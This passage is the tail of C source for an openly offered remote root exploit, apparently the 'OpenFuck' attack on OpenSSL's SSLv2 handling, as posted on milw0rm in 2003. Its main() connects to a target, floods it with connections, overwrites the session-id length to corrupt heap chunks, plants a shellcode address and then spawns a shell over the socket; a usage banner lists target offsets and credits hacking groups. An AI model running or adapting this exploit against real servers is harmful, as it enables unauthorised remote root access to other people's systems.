&nbsp; &nbsp; &nbsp; &nbsp; int len;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) &gt; 0) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("get server finished: Expected SSL2 MT ERROR, got %x\n", (int)buf[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
}<br/>
void usage(char* argv0)<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(": Usage: %s target box [port] [-c N]\n\n", argv0);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;target - supported box eg: 0x00\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;box - hostname or IP address\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;port - port for ssl connection\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;-c open N connections. (use range 40-50 if u dont know)\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;\n\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;Supported OffSet:\n");<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i=0; i&lt;=MAX_ARCH; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("\t0x%02x - %s\n", i, architectures[i].desc);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n");<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; exit(1);<br/>
}<br/>
int main(int argc, char* argv[])<br/>
{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; char* host;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int port = 443;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int i;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int arch;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; int N = 0;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl_conn* ssl1;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl_conn* ssl2;<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("*******************************************************************\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("*******************************************************************\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* by SPABAM &nbsp; &nbsp;with code of Spabam - LSD-pl - SolarEclipse - CORE *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* #hackarena &nbsp;irc.brasnet.org &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("*******************************************************************\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((argc &lt; 3) || (argc &gt; 6))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage(argv[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; sscanf(argv[1], "0x%x", &amp;arch);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if ((arch &lt; 0) || (arch &gt; MAX_ARCH))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage(argv[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; host = argv[2];<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (argc == 4)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; port = atoi(argv[3]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else if (argc == 5) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (strcmp(argv[3], "-c"))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage(argv[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; N = atoi(argv[4]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else if (argc == 6) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; port = atoi(argv[3]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (strcmp(argv[4], "-c"))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usage(argv[0]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; N = atoi(argv[5]);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; srand(0x31337);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i=0; i&lt;N; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("\rConnection... %d of %d", i+1, N);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fflush(stdout);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; connect_host(host, port);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usleep(100000);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if (N) printf("\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("Establishing SSL connection\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl1 = ssl_connect_host(host, port);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ssl2 = ssl_connect_host(host, port);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_hello(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_hello(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; generate_session_keys(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_verify(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_finished(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_finished(ssl1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("Ready to send shellcode\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; port = get_local_port(ssl2-&gt;sock);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port &amp; 0xff);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port &gt;&gt; 8) &amp; 0xff);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; *(int*)&amp;overwrite_next_chunk[156] = cipher;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; *(int*)&amp;overwrite_next_chunk[192] = architectures[arch].func_addr - 12;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; *(int*)&amp;overwrite_next_chunk[196] = ciphers + 16; &nbsp; &nbsp; &nbsp; /* shellcode address */<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_hello(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_hello(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; generate_session_keys(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_verify(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; ssl2-&gt;conn_id_length; i++) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ssl2-&gt;conn_id[i] = (unsigned char) (rand() &gt;&gt; 24);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; send_client_finished(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; get_server_error(ssl2);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; printf("Spawning shell...\n");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; sleep(1);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; sh(ssl2-&gt;sock);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; close(ssl2-&gt;sock);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; close(ssl1-&gt;sock);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br/>
}<br/>
/* spabam: It isn't 0day */<br/>
<br/>
// milw0rm.com [2003-04-04]<br/>
</body></html>